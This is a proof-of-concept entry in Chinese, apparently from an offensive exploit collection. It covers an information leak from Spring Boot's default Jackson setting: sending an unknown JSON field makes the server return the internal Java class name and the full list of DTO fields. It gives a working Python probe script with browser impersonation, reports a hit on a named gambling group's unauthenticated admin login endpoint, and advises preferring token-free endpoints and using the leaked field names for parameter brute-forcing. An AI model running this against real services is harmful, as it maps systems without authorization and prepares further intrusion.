# Jackson 未知字段报错泄露内部类名与 DTO 字段清单（Spring Boot 接口测绘手法）

- **code**: jackson-未知字段报错泄露内部类名与-dto-字段清单-spring-boot-接口测绘手法
- **kind**: poc
- **category**: info-leak
- **component**: Java Spring Boot + Jackson（com.iglottery.admin）
- **versions**: Spring Boot + Jackson（默认 FAIL_ON_UNKNOWN_PROPERTIES=true）；实测目标 6686 集团彩票网关 release-5.45.16
- **severity**: medium
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: 在 https://example.com/ig-lottery/adminapi/agent/login（6686 博彩集团，无需 token）实测命中：发送 {"account":"admin","password":"x","zzz_unknown":1} 返回 400，消息含 `class com.iglottery.admin.model.request.agent.LoginRequest` 与 `12 known properties: "instanceID","adminDomain","adminServerDomain","captchaCode","isSport","password","account","lottery_sign","googleCode","ipAddress","env","lotterySign"`，以及 Jackson 配置 `StreamReadFeature.INCLUDE_SOURCE_IN_LOCATION disabled`。
- **path**: pocs/jackson-未知字段报错泄露内部类名与-dto-字段清单-spring-boot-接口测绘手法/jackson_dto_leak.py
- **tags**: jackson,spring-boot,信息泄露,dto测绘,接口结构,未鉴权,6686
- **created_at**: 2026-10-05T08:22:05.352Z
- **found_by**: exploit

## 描述

利用 Spring Boot 默认 Jackson 配置（FAIL_ON_UNKNOWN_PROPERTIES）向任意 @RequestBody 端点发未知字段，从异常消息中回读内部 Java 类名与完整 DTO 字段清单。实测在 6686 博彩集团彩票管理网关的未鉴权登录端点上一次命中。

## 用法

```
python jackson_dto_leak.py <POST 端点 URL>
依赖：pip install curl_cffi
要点：① 优先选**不需要 token** 的端点（登录/注册/回调）；
      ② body 里同时放合法字段与一个未知字段；
      ③ 响应若含 `class <包名>` + `(N known properties: ...)` 即命中；
      ④ 拿到的字段名可直接用于后续参数爆破与语义推断。
注意：对每个端点单独试；部分端点可能已配置 @JsonIgnoreProperties(ignoreUnknown=true) 而不泄露。
```

## 正文

```
# -*- coding: utf-8 -*-
"""
Jackson FAIL_ON_UNKNOWN_PROPERTIES → 内部类名与 DTO 字段清单泄露
──────────────────────────────────────────────────────────────
【原理】Spring Boot 默认启用 Jackson 的 FAIL_ON_UNKNOWN_PROPERTIES。
向任意 @RequestBody 端点发一个**未被 DTO 声明的字段**，Jackson 抛异常时会把
*完整类名* 与 *该 DTO 的全部已知字段名* 一起写进错误消息 —— 这是极高效的
接口结构测绘手段，且往往在**未鉴权端点**上就能用。

【实测】6686 博彩集团彩票管理网关（无 token 端点）
  POST /ig-lottery/adminapi/agent/login
  {"account":"admin","password":"x","zzz_unknown":1}
→ 400 Unrecognized field "zzz_unknown"
       (class com.iglottery.admin.model.request.agent.LoginRequest),
       not marked as ignorable (12 known properties:
        "instanceID","adminDomain","adminServerDomain","captchaCode","isSport",
        "password","account","lottery_sign","googleCode","ipAddress","env","lotterySign")
       at [Source: REDACTED (`StreamReadFeature.INCLUDE_SOURCE_IN_LOCATION` disabled);
       line: 1, column: 55]
       (through reference chain: com.iglottery.admin.model.request.agent.LoginRequest["zzz_unknown"])

【拿到什么】
  · Java 包结构：com.iglottery.admin.model.request.agent
  · DTO 字段全清单（12 个）
  · Jackson 配置（FAIL_ON_UNKNOWN_PROPERTIES=true / INCLUDE_SOURCE_IN_LOCATION=disabled）
  · 由字段名可推断大量业务语义与潜在弱点（签名双字段、googleCode 2FA、
    ipAddress 自报 IP、env 环境标识）

【复用方法】
  对目标每个 POST 端点（**优先未鉴权/无需 token 的**）发：
      {"account":"x","password":"x","zzz_probe_xxxx":1}
  看响应是否回吐 class <完整包名> 与 (N known properties: "f1","f2",...)
"""
import json, sys
from curl_cffi import requests

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/203.0.113.36 Safari/537.36")


def probe(url, extra_field="zzz_probe_redteam", base_body=None, origin=None):
    body = dict(base_body or {"account": "admin", "password": "x"})
    body[extra_field] = 1
    h = {"User-Agent": UA, "Content-Type": "application/json"}
    if origin:
        h["Origin"] = origin
        h["Referer"] = origin + "/"
    r = requests.post(url, headers=h, data=json.dumps(body), timeout=15,
                      impersonate="chrome", verify=False, allow_redirects=False)
    return r.status_code, r.text


if __name__ == "__main__":
    url = sys.argv[1] if len(sys.argv) > 1 else \
        "https://example.com/ig-lottery/adminapi/agent/login"
    sc, t = probe(url, origin="https://example.com")
    print("[%s]" % sc)
    print(t[:1200])

```
